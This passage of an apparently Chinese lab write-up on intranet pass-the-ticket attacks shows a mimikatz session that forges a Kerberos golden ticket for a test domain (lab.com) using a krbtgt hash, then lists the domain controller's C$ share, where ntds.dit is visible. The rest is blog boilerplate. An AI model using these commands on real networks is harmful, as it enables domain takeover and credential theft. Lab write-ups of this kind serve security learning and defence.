2\x64&gt;mimikatz.exe</span><br><span class="line"></span><br><span class="line">  .<span class="comment">#####.   mimikatz 2.2.0 (x64) #19041 Jul  9 2021 22:59:41</span></span><br><span class="line"> .<span class="comment">## ^ ##.  &quot;A La Vie, A L&#x27;Amour&quot; - (oe.eo)</span></span><br><span class="line"> <span class="comment">## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )</span></span><br><span class="line"> <span class="comment">## \ / ##       &gt; https://blog.gentilkiwi.com/mimikatz</span></span><br><span class="line"> <span class="string">&#x27;## v ##&#x27;</span>       Vincent LE TOUX             ( vincent.letoux@gmail.com )</span><br><span class="line">  <span class="string">&#x27;#####&#x27;</span>        &gt; https://pingcastle.com / https://mysmartlogon.com ***/</span><br><span class="line"></span><br><span class="line">mimikatz <span class="comment"># kerberos::golden /admin:administrator /domain:lab.com /sid:S-1-5-21-1</span></span><br><span class="line">799307087-3941118632-1964125693 /krbtgt:392ffcfeacc6914f5a2e4d3f7893457d /ptt</span><br><span class="line">User      : administrator</span><br><span class="line">Domain    : lab.com (LAB)</span><br><span class="line">SID       : S-1-5-21-1799307087-3941118632-1964125693</span><br><span class="line">User Id   : 500</span><br><span class="line">Groups Id : *513 512 520 518 519</span><br><span class="line">ServiceKey: 392ffcfeacc6914f5a2e4d3f7893457d - rc4_hmac_nt</span><br><span class="line">Lifetime  : 2021/12/19 15:30:40 ; 2031/12/17 15:30:40 ; 2031/12/17 15:30:40</span><br><span class="line">-&gt; Ticket : ** Pass The Ticket **</span><br><span class="line"></span><br><span class="line"> * PAC generated</span><br><span class="line"> * PAC signed</span><br><span class="line"> * EncTicketPart generated</span><br><span class="line"> * EncTicketPart encrypted</span><br><span class="line"> * KrbCred generated</span><br><span class="line"></span><br><span class="line">Golden ticket <span class="keyword">for</span> <span class="string">&#x27;administrator @ lab.com&#x27;</span> successfully submitted <span class="keyword">for</span> current s</span><br><span class="line">ession</span><br><span class="line"></span><br><span class="line">mimikatz <span class="comment"># exit</span></span><br><span class="line">Bye!</span><br><span class="line"></span><br><span class="line">C:\Users\cve-test\Desktop\mimikatz_trunk1 2\x64&gt;klist</span><br><span class="line"></span><br><span class="line">当前登录 ID 是 0:0x5028a</span><br><span class="line"></span><br><span class="line">缓存的票证: (1)</span><br><span class="line"></span><br><span class="line"><span class="comment">#0&gt;     客户端: administrator @ lab.com</span></span><br><span class="line">        服务器: krbtgt/lab.com @ lab.com</span><br><span class="line">        Kerberos 票证加密类型: RSADSI RC4-HMAC(NT)</span><br><span class="line">        票证标志 0x40e00000 -&gt; forwardable renewable initial pre_authent</span><br><span class="line">        开始时间: 12/19/2021 15:30:40 (本地)</span><br><span class="line">        结束时间:   12/17/2031 15:30:40 (本地)</span><br><span class="line">        续订时间: 12/17/2031 15:30:40 (本地)</span><br><span class="line">        会话密钥类型: RSADSI RC4-HMAC(NT)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">C:\Users\cve-test\Desktop\mimikatz_trunk1 2\x64&gt;dir \\dc01.lab.com\c$</span><br><span class="line"> 驱动器 \\dc01.lab.com\c$ 中的卷没有标签。</span><br><span class="line"> 卷的序列号是 C219-9288</span><br><span class="line"></span><br><span class="line"> \\dc01.lab.com\c$ 的目录</span><br><span class="line"></span><br><span class="line">2021/10/23  20:12    &lt;JUNCTION&gt;     $SNAP_202110232011_VOLUMEC$ [\??\Volume&#123;2069</span><br><span class="line">70b5-33f3-11ec-80bd-000c29ed4c86&#125;\]</span><br><span class="line">2021/12/11  20:27    &lt;JUNCTION&gt;     $SNAP_202112112026_VOLUMEC$ [\??\Volume&#123;aab2</span><br><span class="line">c429-3950-11ec-80c2-000c29ed4c86&#125;\]</span><br><span class="line">2021/12/11  20:26        20,987,904 ntds.dit</span><br><span class="line">2013/08/22  23:52    &lt;DIR&gt;          PerfLogs</span><br><span class="line">2021/08/23  20:36    &lt;DIR&gt;          Program Files</span><br><span class="line">2013/08/22  23:39    &lt;DIR&gt;          Program Files (x86)</span><br><span class="line">2021/12/11  20:31        12,935,168 system</span><br><span class="line">2021/08/23  19:57    &lt;DIR&gt;          Users</span><br><span class="line">2021/09/26  11:20    &lt;DIR&gt;          Windows</span><br><span class="line">               2 个文件     33,923,072 字节</span><br><span class="line">               7 个目录 49,284,296,704 可用字节</span><br><span class="line"></span><br><span class="line">C:\Users\cve-test\Desktop\mimikatz_trunk1 2\x64&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/bmjoker/p/10355979.html">https://www.cnblogs.com/bmjoker/p/10355979.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://shu1l.github.io/2020/06/06/qian-xi-huang-jin-piao-ju-yu-bai-yin-piao-ju/">https://shu1l.github.io/2020/06/06/qian-xi-huang-jin-piao-ju-yu-bai-yin-piao-ju/</a></p>
+
+	  
+	</div>
+
+	
+	<span id="/2021/12/20/%E5%86%85%E7%BD%91PTT/" class="leancloud-visitors view" data-flag-title="内网PTT">
+		<em class="post-meta-item-text"> Page View </em> <i class="leancloud-visitors-count"></i>
+	</span>
+	
+	<div>
+  	<center>
+
+	<div class="pagination">
+
+    
+    
+    <a type="button" class="btn btn-default disabled"><i class="fa fa-arrow-circle-o-left"></i>上一页</a>
+    
+
+    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
+    
+    <a href="/2021/12/20/内网PTH/" type="button" class="btn btn-default ">下一页<i
+                class="fa fa-arrow-circle-o-right"></i></a>
+    
+
+    
+</div>
+
+
+    </center>
+	</div>
+	
+	<!-- comment -->
+	<!--
+<section id="comment">
+    <h2 class="title">留言</h2>
+
+    
+</section>
+
+-->
+	
+		<section id="comments" class="comments">
+			<style>
+			.comments{margin:30px;padding:10px;background:rgb(0, 0, 0)}
+			@media screen and (max-width:800px){.comments{margin:auto;padding:10px;background:#000}}
+			</style>
+			<div id="vcomment" class="comment"></div>
+<script src='//unpkg.com/valine/dist/Valine.min.js'></script>
+<script src="https://cdnjs.loli.net/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+<script>
+var valineConfig = {"enable":true,"appId":"xxx","appKey":"xxx","placeholder":"提交评论时留下邮箱收到回复后将自动通知","visitor":true,"avatar":"monsterid","requiredFields":["nick","mail"]}
+valineConfig.el='#vcomment';
+new Valine(valineConfig);
+    // new Valine({
+    //     el: '#vcomment',
+    //     appId: "",
+    //     appKey: "",
+    //     placeholder: "提交评论时留下邮箱收到回复后将自动通知",
+    //     avatar:"monsterid",
+    //     visitor: "true",
+    //     requiredFields: "nick,mail".split(','),
+    // });
+</script>
+
+		</section>
+	
+	</div> <!-- col-md-9/col-md-12 -->
+
+
+	
+	<div id="side_meta">
+		<div class="col-md-3" id="post_meta"> 
+
+	<!-- date -->
+	
+	<div class="meta-widget">
+	<i class="fa fa-clock-o"></i>
+	2021-12-20 
+	</div>
+	
+
+	<!-- categories -->
+    
+
+	<!-- tags -->
+	
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#tags"><i class="fa fa-tags"></i></a>		  
+    <ul id="tags" class="tag_box list-unstyled collapse in">	  
+	    
+  <li><a href="/tags/内网/">内网<span>2</span></a></li>
+    </ul>
+	</div>
+		
+
+	<!-- toc -->
+	<div class="meta-widget">
+	
+	</div>
+	
+    <hr>
+	
+</div><!-- col-md-3 -->
+
+		
+
+	</div>
+	
+		
+
+</div><!-- row -->
+
+<!--
+ -->
+
+
+
+	</div>
+  </div>
+  <div class="container-narrow">
+  <footer> <p>
+  
+  &copy; 2021 Wu1ala's Blog
+  
+      powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.Theme <a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank">freemind.bithack</a>  
+</p>
+ </footer>
+</div> <!-- container-narrow -->
+  
+
+
+  
+<a id="gotop" href="#">   
+  <span>⬆︎TOP</span>
+</a>
+
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/bootstrap.min.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/search.js"></script> 
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+
+   <script type="text/javascript">      
+     var search_path = "search.xml";
+	 if (search_path.length == 0) {
+	 	search_path = "search.xml";
+	 }
+	 var path = "/" + search_path;
+     searchFunc(path, 'local-search-input', 'local-search-result');
+   </script>
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/wanko.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true},"react":{"opacity":0.7},"log":false});</script></body>
+   </html>
